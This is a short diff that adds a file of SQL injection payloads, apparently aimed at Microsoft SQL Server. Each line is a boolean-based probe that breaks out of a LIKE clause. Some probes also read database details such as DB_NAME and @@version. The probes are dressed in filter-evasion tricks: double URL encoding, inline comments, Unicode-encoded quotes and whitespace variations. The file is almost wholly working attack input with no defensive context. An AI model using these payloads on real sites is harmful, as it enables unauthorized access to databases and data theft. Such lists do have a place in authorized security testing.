@@ -1,0 +1,20 @@
+-- Double URL encoded
+%25%27 AND LEN(%27test%27)=4 AND %27gXBu%25%27=%27gXBu
+
+-- Inline comments between function and parens
+%' AND LEN/**/(/**/'test'/**/)=4 AND 'gXBu%'='gXBu
+
+-- Unicode encoded quotes
+%' AND LEN(%u0027test%u0027)=4 AND %u0027gXBu%25%u0027=%u0027gXBu
+
+-- Whitespace variations
+%' AND LEN(	'test'	)=4 AND 'gXBu%'='gXBu
+
+-- Try DB_NAME with comments
+%' AND LEN/**/( DB_NAME/**/(/**/))>1 AND 'gXBu%'='gXBu
+
+-- @@version with comments
+%' AND LEN(/**/@@version/**/)>1 AND 'gXBu%'='gXBu
+
+-- CHARINDEX with comments
+%' AND CHARINDEX/**/(/**/'a',/**/'a'/**/)=1 AND 'gXBu%'='gXBu
